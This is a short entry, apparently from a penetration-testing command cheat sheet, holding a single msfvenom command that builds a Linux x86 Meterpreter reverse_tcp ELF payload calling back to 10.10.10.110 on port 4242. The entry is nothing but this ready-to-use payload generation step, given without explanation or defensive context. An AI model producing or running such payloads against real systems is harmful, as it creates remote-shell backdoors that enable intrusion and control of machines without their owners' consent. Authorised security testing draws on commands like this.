---
id: e9a1d152-c12d-4cf3-b538-8f579046c7ee
name: Generate Linux Meterpreter Reverse Shell
type: command
executor: bash
data: $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242
  -f elf > shell.elf
output: null
created_at: '2023-04-06T03:56:21.275188+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Linux Meterpreter Reverse Shell

```bash
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
```
